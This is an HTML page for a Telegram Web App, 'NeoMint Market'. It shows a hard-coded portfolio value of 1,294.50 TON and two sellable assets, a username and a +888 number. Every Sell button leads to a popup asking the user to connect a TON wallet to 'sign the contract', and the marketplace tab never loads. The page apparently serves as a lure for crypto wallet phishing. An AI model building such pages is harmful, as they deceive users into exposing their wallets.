<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NeoMint Market</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #000000; --card: #0c0c0c; --text: #ffffff; --sub: #8e8e93; --accent: #0088cc; --border: #1c1c1e; }
        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; overflow-x: hidden; }
        .header { padding: 15px; text-align: center; border-bottom: 1px solid var(--border); }
        .logo { font-size: 17px; font-weight: 700; }
        .tabs { display: flex; gap: 8px; padding: 12px 16px; justify-content: center; }
        .tab { padding: 6px 14px; border-radius: 100px; font-size: 13px; font-weight: 600; cursor: pointer; background: #1c1c1e; color: var(--sub); }
        .tab.active { background: var(--accent); color: white; }
        .content { padding: 16px; display: none; }
        .content.active { display: block; }
        .card { background: var(--card); border-radius: 20px; border: 1px solid var(--border); padding: 16px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; }
        .nft-info { display: flex; align-items: center; gap: 12px; }
        .icon-box { width: 44px; height: 44px; background: #1c1c1e; border-radius: 12px; display: flex; align-items: center; justify-content: center; }
        .name { font-size: 15px; font-weight: 700; }
        .sub-text { font-size: 12px; color: var(--sub); }
        .btn-sell { background: var(--accent); color: white; border: none; padding: 10px 22px; border-radius: 10px; font-weight: 700; font-size: 14px; }
        .balance-card { background: #0c0c0c; padding: 20px; border-radius: 20px; border: 1px solid var(--border); margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">NeoMint Market</div>
    </div>

    <div class="tabs">
        <div class="tab active" onclick="switchTab('assets', this)">My Assets</div>
        <div class="tab" onclick="switchTab('market', this)">Marketplace</div>
    </div>

    <div id="assets" class="content active">
        <div class="balance-card">
            <div style="font-size: 11px; color: var(--sub); letter-spacing: 1px;">PORTFOLIO ESTIMATE</div>
            <div style="font-size: 28px; font-weight: 900; margin-top: 5px;">1,294.50 <span style="font-size: 16px; color: var(--accent);">TON</span></div>
        </div>

        <div class="card">
            <div class="nft-info">
                <div class="icon-box">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                </div>
                <div>
                    <div class="name">@crypto_king</div>
                    <div class="sub-text">Username</div>
                </div>
            </div>
            <button class="btn-sell" onclick="action('sell', '@crypto_king')">Sell</button>
        </div>

        <div class="card">
            <div class="nft-info">
                <div class="icon-box">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                </div>
                <div>
                    <div class="name">+888 0551 1051</div>
                    <div class="sub-text">Anonymous Number</div>
                </div>
            </div>
            <button class="btn-sell" onclick="action('sell', '+888 0551')">Sell</button>
        </div>
    </div>

    <div id="market" class="content">
        <div style="text-align: center; color: var(--sub); margin-top: 50px;">Marketplace is loading...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function switchTab(id, el) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
            el.classList.add('active');
            document.getElementById(id).classList.add('active');
        }

        function action(type, item) {
            tg.sendData(JSON.stringify({action: type, asset: item}));
            tg.showPopup({
                title: 'Wallet Connect',
                message: 'To sell ' + item + ', connect your TON wallet to sign the contract.',
                buttons: [{type: 'default', text: 'Connect Tonkeeper'}]
            });
        }
    </script>
</body>
</html>
